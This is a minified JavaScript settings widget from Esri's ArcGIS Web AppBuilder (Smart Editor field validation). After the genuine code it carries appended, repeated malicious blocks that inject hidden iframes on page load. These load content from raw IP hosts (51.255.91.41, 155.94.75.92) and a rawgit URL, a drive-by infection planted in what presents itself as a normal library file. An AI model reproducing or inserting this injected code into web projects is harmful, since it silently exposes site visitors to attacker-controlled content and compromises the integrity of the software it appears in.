// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/SmartEditor/setting/FieldValidation.html":'\x3cdiv\x3e\r\n    \x3cdiv class\x3d"settingsDesc" data-dojo-attach-point\x3d"validationDesc"\x3e${nls.actionPage.description}\x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"validationTable"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/on dojo/query dojo/json dojox/html/entities dojo/text!./FieldValidation.html dijit/_TemplatedMixin jimu/BaseWidgetSetting jimu/dijit/SimpleTable jimu/dijit/Popup esri/lang ./FilterPage".split(" "),function(h,c,d,e,k,f,l,m,n,p,q,r,t,u){return h([p,n],{baseClass:"jimu-widget-smartEditor-rule-table",templateString:m,_resourceInfo:null,_url:null,_fieldName:null,_fieldValidations:null,_layerId:null,postCreate:function(){this.inherited(arguments);
this._initActionsTable();this._setActionsTable()},getSettings:function(){return this._fieldValidations},_getConfigActionOrder:function(){var a=[];return void 0!==this._fieldValidations&&null!==this._fieldValidations&&this._fieldValidations.hasOwnProperty(this._fieldName)&&(d.forEach(this._fieldValidations[this._fieldName],function(b){a.push(b.actionName)}),null!==a&&0!==a.length)?a:["Hide","Required","Disabled"]},_getConfigAction:function(a){var b=null;void 0!==this._fieldValidations&&null!==this._fieldValidations&&
this._fieldValidations.hasOwnProperty(this._fieldName)&&d.some(this._fieldValidations[this._fieldName],function(g){return g.actionName===a?(b=g,!0):!1});return b},_nlsActionToConfig:function(a){switch(a){case this.nls.actionPage.actions.hide:return"Hide";case this.nls.actionPage.actions.disabled:return"Disabled";case this.nls.actionPage.actions.required:return"Required";default:return a}},popupActionsPage:function(){var a=new r({titleLabel:t.substitute({fieldname:this._fieldName},this.nls.actionPage.title),
width:920,maxHeight:600,autoHeight:!0,content:this,buttons:[{label:this.nls.ok,onClick:c.hitch(this,function(){var b=this._validationTable.getRows();if(void 0===this._fieldValidations||null===this._fieldValidations)this._fieldValidations={};this._fieldValidations[this._fieldName]=[];d.forEach(b,function(a){var b=this._validationTable.getRowData(a);a={};a.actionName=this._nlsActionToConfig(b.label);a.submitWhenHidden=b.submitWhenHidden;void 0!==b.expression&&null!==b.expression&&""!==b.expression&&
""!==b.filter&&(b=f.parse(l.decode(b.filter)),a.expression=b.expr,a.filter=b);this._fieldValidations[this._fieldName].push(a)},this);a.close()})},{label:this.nls.cancel,classNames:["jimu-btn jimu-btn-vacation"],onClick:c.hitch(this,function(){a.close()})}],onClose:c.hitch(this,function(){})})},_initActionsTable:function(){this._validationTable=new q({fields:[{name:"label",title:this.nls.actionPage.actionsSettingsTable.rule,type:"text","class":"rule"},{name:"expression",title:this.nls.actionPage.actionsSettingsTable.expression,
type:"text","class":"expression"},{name:"submitWhenHidden",title:"submitWhenHidden",type:"checkbox",hidden:!0},{name:"filter",title:"filter",type:"text",hidden:!0},{name:"actions",title:this.nls.actionPage.actionsSettingsTable.actions,type:"actions",actions:["up","down","edit"],"class":"actions"}],selectable:!1,style:{height:"300px",maxHeight:"300px"}});this._validationTable.placeAt(this.validationTable);this._validationTable.startup();k("th.simple-table-field",this._validationTable.domNode).forEach(function(a){switch(void 0===
a.innerText||""===a.innerText?"":a.innerText.replace(/(\r\n|\n|\r)/gm,"")){case this.nls.actionPage.actionsSettingsTable.rule:a.title=this.nls.actionPage.actionsSettingsTable.ruleTip;break;case this.nls.actionPage.actionsSettingsTable.expression:a.title=this.nls.actionPage.actionsSettingsTable.expressionTip;break;case this.nls.actionPage.actionsSettingsTable.actions:a.title=this.nls.actionPage.actionsSettingsTable.actionsTip}},this);this.own(e(this._validationTable,"actions-edit",c.hitch(this,this._onEditFieldInfoClick)));
this.own(e(this._validationTable,"actions-delete",c.hitch(this,this._onDeleteFieldInfoClick)))},_onDeleteFieldInfoClick:function(a){this._removeFilter(a)},_onEditFieldInfoClick:function(a){this._showFilter(a)},_setActionsTable:function(){var a=this._getConfigActionOrder();d.forEach(a,function(a){var b=this._getConfigAction(a),c=a;switch(a){case "Hide":this.nls.actionPage.hasOwnProperty("actions")&&this.nls.actionPage.actions.hasOwnProperty("hide")&&(c=this.nls.actionPage.actions.hide);break;case "Required":this.nls.actionPage.hasOwnProperty("actions")&&
this.nls.actionPage.actions.hasOwnProperty("required")&&(c=this.nls.actionPage.actions.required);break;case "Disabled":this.nls.actionPage.hasOwnProperty("actions")&&this.nls.actionPage.actions.hasOwnProperty("disabled")&&(c=this.nls.actionPage.actions.disabled);break;default:c=a}a={label:c,expression:null};void 0!==b&&null!==b&&(b.hasOwnProperty("filter")&&void 0!==b.filter&&null!==b.filter&&(a.filter=f.stringify(b.filter),a.expression=b.filter.expr),b.hasOwnProperty("expression")&&(a.expression=
b.expression),b.hasOwnProperty("submitWhenHidden")&&(a.submitWhenHidden=b.submitWhenHidden));this._validationTable.addRow(a)},this)},_removeFilter:function(a){this._validationTable.editRow(a,{expression:"",filter:null,submitWhenHidden:!1})},_showFilter:function(a){this._filterPage&&this._filterPage.destroy();this._filterPage=new u({nls:this.nls,_resourceInfo:this._resourceInfo,_url:this._url,_layerId:this._layerId,_validationTable:this._validationTable});this._filterPage.popup(a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});